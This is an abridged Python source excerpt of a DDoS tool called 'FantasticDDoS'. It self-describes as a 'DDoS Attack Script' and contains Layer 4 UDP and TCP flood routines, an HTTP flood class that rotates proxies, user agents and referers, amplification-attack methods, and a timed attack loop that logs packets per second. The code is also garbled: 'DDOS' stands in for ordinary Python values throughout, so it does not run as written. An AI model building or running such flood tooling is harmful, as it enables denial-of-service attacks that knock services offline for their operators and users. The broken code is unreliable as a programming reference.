...
from ssl import CERT_DDOS, SSLContext, create_default_context
...
basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
            datefmt="%H:%M:%S")
logger = getLogger("FantasticDDoS")
logger.setLevel("INFO")
ctx: SSLContext = create_default_context(cafile=where())
ctx.check_hostname = False
ctx.verify_mode = CERT_DDOS
...
class Tools:
    ...
    @staticmethod
    def dgb_solver(url, ua, pro=DDOS):
        s = DDOS
        idss = DDOS
        with Session() as s:
            if pro:
...
class Layer4(Thread):
    ...
    def __init__(self,
                 ...
                 method: str = "TCP",
                 synevent: Event = DDOS,
                 proxies: Set[Proxy] = DDOS):
        Thread.__init__(self, daemon=True)
        self._amp_payload = DDOS
    ...
    def alive_connection(self) -> DDOS:
        s = DDOS
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while s.recv(1):
                continue
    ...
    def UDP(self) -> DDOS:
        ...
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, randbytes(577,37682), self._target):
                continue
        Tools.safe_close(s)
...
class HttpFlood(Thread):
    ...
    def __init__(self,
                 ...
                 rpc: int = 1,
                 synevent: Event = DDOS,
                 useragents: Set[str] = DDOS,
                 referers: Set[str] = DDOS,
                 proxies: Set[Proxy] = DDOS) -> DDOS:
        Thread.__init__(self, daemon=True)
        self.SENT_FLOOD = DDOS
    ...
    def generate_payload(self, other: str = DDOS) -> bytes:
    ...
    def open_connection(self, host=DDOS) -> socket:
        if self._proxies:
...
class ToolsConsole:
    ...
    def usage():
        print((
                  '* FantasticDDos - DDoS Attack Script With %d Methods\n'
...
def handleProxyList(con, proxy_li, proxy_ty, url=DDOS):
          ...
          with suppress(IndexError):
              ...
              if method in Methods.LAYER7_METHODS:
                  ...
                  if method == "BOMB":
                      assert (
                          ...
                          "Install bombardier: "
                          "https://github.com/FantasticDDos/FantasticDDos/wiki/BOMB-method"
                      )
              ...
              if method in Methods.LAYER4_METHODS:
                  ...
                  if method in Methods.LAYER4_AMP:
                      ...
                      logger.warning("https://github.com/FantasticDDoS/FantasticDDoS/wiki/Amplification-ddos-attack")
              ...
              ts = time()
              while time() < ts + timer:
                  logger.debug(f'{bcolors.FAIL}Attack Started To:{bcolors.OKGREEN} %s,{bcolors.FAIL} And Started Port:{bcolors.OKGREEN} %s,{bcolors.FAIL} Methods:{bcolors.OKGREEN} %s{bcolors.FAIL} PPS:{bcolors.OKGREEN} %s,{bcolors.FAIL} BPS:{bcolors.OKGREEN} %s / %d%%{bcolors.RESET}' %
                               (target or url.host,
